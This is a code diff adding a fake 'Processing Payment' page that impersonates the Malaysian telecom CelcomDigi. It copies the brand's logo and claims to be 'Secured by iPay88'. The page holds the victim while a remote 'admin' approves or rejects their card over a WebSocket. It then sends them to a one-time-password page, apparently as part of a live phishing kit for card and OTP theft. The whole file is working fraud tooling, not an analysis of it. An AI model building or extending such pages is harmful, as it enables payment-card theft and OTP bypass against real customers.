@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Processing Payment - CelcomDigi</title>
+  <link rel="icon" href="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/637c596725cb8b7f82fe3680_favicon.png" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #003087;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .logo-wrap {
+      margin-bottom: 40px;
+    }
+    .logo-wrap img {
+      height: 36px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 48px 32px;
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.18);
+    }
+
+    .spinner-wrap {
+      margin-bottom: 28px;
+    }
+
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border: 5px solid #e8edf5;
+      border-top-color: #003087;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .processing-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 10px;
+    }
+
+    .processing-sub {
+      font-size: 14px;
+      color: #666;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    .dots span {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #003087;
+      margin: 0 4px;
+      animation: bounce 1.2s infinite;
+    }
+    .dots span:nth-child(2) { animation-delay: 0.2s; }
+    .dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes bounce {
+      0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+      40% { transform: scale(1); opacity: 1; }
+    }
+
+    .secure-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #888;
+      margin-top: 24px;
+    }
+    .secure-badge svg {
+      width: 14px;
+      height: 14px;
+      fill: #888;
+    }
+
+    .timeout-badge {
+      display: inline-block;
+      background: #FFD700;
+      color: #111;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 5px 18px;
+      border-radius: 20px;
+      margin-bottom: 24px;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo-wrap">
+    <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" alt="CelcomDigi" />
+  </div>
+
+  <div class="card">
+    <div class="timeout-badge" id="timeoutBadge">Timeout: 08:00</div>
+
+    <div class="spinner-wrap">
+      <div class="spinner"></div>
+    </div>
+
+    <div class="processing-title">Processing Payment</div>
+    <div class="processing-sub">
+      Please wait while we verify your card details.<br>
+      Do not close or refresh this page.
+    </div>
+
+    <div class="dots">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    <div class="secure-badge">
+      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+      Secured by iPay88
+    </div>
+  </div>
+
+  <script>
+    // Get URL params
+    const params = new URLSearchParams(window.location.search);
+    const sessionId = params.get('sessionId');
+    const number = params.get('number');
+    const amount = params.get('amount');
+    const ref = params.get('ref');
+    const type = params.get('type') || 'bill';
+
+    if (!sessionId) {
+      window.location.href = '/bill';
+    }
+
+    // Timeout countdown
+    let timeLeft = 8 * 60;
+    const timeoutBadge = document.getElementById('timeoutBadge');
+    const timeoutInterval = setInterval(() => {
+      timeLeft--;
+      const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+      const s = (timeLeft % 60).toString().padStart(2, '0');
+      timeoutBadge.textContent = `Timeout: ${m}:${s}`;
+      if (timeLeft <= 0) {
+        clearInterval(timeoutInterval);
+        window.location.href = type === 'reload' ? '/reload' : '/bill';
+      }
+    }, 1000);
+
+    // WebSocket connection to wait for admin decision
+    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const wsUrl = `${wsProtocol}//${window.location.host}?role=client&sessionId=${sessionId}`;
+    let ws;
+
+    function connectWS() {
+      ws = new WebSocket(wsUrl);
+
+      ws.onopen = () => {
+        console.log('[WS] Connected, waiting for admin decision...');
+      };
+
+      ws.onmessage = (event) => {
+        const data = JSON.parse(event.data);
+        console.log('[WS] Message:', data);
+
+        if (data.type === 'status_update' && data.sessionId === sessionId) {
+          handleStatusUpdate(data.status);
+        }
+      };
+
+      ws.onclose = () => {
+        console.log('[WS] Disconnected, reconnecting in 3s...');
+        setTimeout(connectWS, 3000);
+      };
+
+      ws.onerror = (err) => {
+        console.error('[WS] Error:', err);
+      };
+    }
+
+    function handleStatusUpdate(status) {
+      if (status === 'approved') {
+        clearInterval(timeoutInterval);
+        // Navigate to OTP page
+        const otpUrl = `/otp?sessionId=${sessionId}&number=${encodeURIComponent(number)}&amount=${encodeURIComponent(amount)}&ref=${encodeURIComponent(ref)}&type=${type}`;
+        window.location.href = otpUrl;
+      } else if (status === 'rejected') {
+        clearInterval(timeoutInterval);
+        // Navigate back to credit-card with error message
+        const cardUrl = `/credit-card?number=${encodeURIComponent(number)}&amount=${encodeURIComponent(amount)}&ref=${encodeURIComponent(ref)}&type=${type}&error=card`;
+        window.location.href = cardUrl;
+      }
+    }
+
+    // Also poll as fallback
+    function pollStatus() {
+      fetch(`/api/card-status/${sessionId}`)
+        .then(r => r.json())
+        .then(data => {
+          if (data.success && data.status !== 'pending') {
+            handleStatusUpdate(data.status);
+          }
+        })
+        .catch(() => {});
+    }
+
+    setInterval(pollStatus, 5000);
+    connectWS();
+  </script>
+</body>
+</html>
